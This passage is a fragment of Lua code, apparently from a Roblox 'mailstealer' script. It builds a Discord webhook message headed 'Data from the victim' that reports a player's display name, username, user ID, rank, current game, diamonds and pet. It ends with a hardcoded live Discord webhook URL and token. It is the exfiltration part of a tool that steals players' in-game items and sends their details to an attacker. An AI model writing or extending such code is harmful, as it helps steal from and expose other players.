            { 
                ["title"] = "Hostee Scriptz Mailstealer Results", 
                ["description"] = "**Data from the victim**\nüßëDisplay Name: " .. _G.PlrDisplayNameVictim .. "\nüßëUsername: " .. _G.PlrUserVictim .. "\nüßëUser ID: " .. _G.PlrUserIDVictim .. "\nüê±Rank: " .. _G.CurrentRank .. "\nüéÆPlace: " .. _G.GameIn .. "", 
                ["url"] = "https://discord.gg/rizzhub", 
                ["color"] = webhookcolor, 
                ["fields"] = { 
                    { 
                        ["name"] = "Diamonds üíé", 
                        ["value"] = "```" .. _G.Diamonds .. "```", 
                        ["inline"] = true 
                    }, 
                    { 
                        ["name"] = "Pet Name & Rarity", 
                        ["value"] = "```Pet Name: " .. _G.PetName .. "```", 
                        ["inline"] = true 
                    } 
                } 
            } 
        }, 
        ["attachments"] = {} 
    } 

    local Webhook = "https://discord.com/api/webhooks/1114164888147861534/2pnRiDU0gcz60oWnVlycPWUce7uuaZtcuAAEu6K9dMxcY4SLyehxhGDwmJwaptI74q2e" -- Replace with the new webhook URL

